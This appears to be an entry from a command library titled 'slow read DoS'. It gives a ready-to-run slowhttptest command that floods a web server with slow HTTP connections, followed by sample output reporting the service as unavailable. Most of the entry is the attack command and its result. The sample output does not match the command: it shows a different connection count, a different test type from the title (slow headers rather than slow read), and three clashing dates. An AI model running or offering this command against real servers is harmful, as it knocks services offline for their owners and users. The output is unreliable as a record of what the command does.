---
id: d4363222-2d56-4a3a-a783-5bf14ca8ffc3
name: slow read DoS
type: command
executor: ''
data: slowhttptest -c 500 -H -g -o ./output_file -i 10 -r 200 -t GET -u http://yourwebsite-or-server-ip.com
  -x 24 -p 2
output: "Sun Sep 07 10:45:26 2020:\nSun Sep 17 10:45:26 2020:\n    slowhttptest version\
  \ 1.6\n - https://code.google.com/p/slowhttptest/ -\ntest type:                \
  \        SLOW HEADERS\nnumber of connections:            1000\nURL:            \
  \                  http://192.168.1.202/index.php\nverb:                       \
  \      GET\nContent-Length header value:      4096\nfollow up data max size:   \
  \       52\ninterval between follow up data:  10 seconds\nconnections per seconds:\
  \          200\nprobe connection timeout:         3 seconds\ntest duration:    \
  \                240 seconds\nusing proxy:                      no proxy\n\nSat\
  \ May 17 10:45:26 2014:\nslow HTTP test status on 0th second:\n\ninitializing: \
  \       0\npending:             1\nconnected:           0\nerror:              \
  \ 0\nclosed:              0\nservice available:   No"
created_at: '2020-09-06T18:43:30.675561+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# slow read DoS

```bash
slowhttptest -c 500 -H -g -o ./output_file -i 10 -r 200 -t GET -u http://yourwebsite-or-server-ip.com -x 24 -p 2
```

## Expected Output

```
Sun Sep 07 10:45:26 2020:
Sun Sep 17 10:45:26 2020:
    slowhttptest version 1.6
 - https://code.google.com/p/slowhttptest/ -
test type:                        SLOW HEADERS
number of connections:            1000
URL:                              http://192.168.1.202/index.php
verb:                             GET
Content-Length header value:      4096
follow up data max size:          52
interval between follow up data:  10 seconds
connections per seconds:          200
probe connection timeout:         3 seconds
test duration:                    240 seconds
using proxy:                      no proxy

Sat May 17 10:45:26 2014:
slow HTTP test status on 0th second:

initializing:        0
pending:             1
connected:           0
error:               0
closed:              0
service available:   No
```


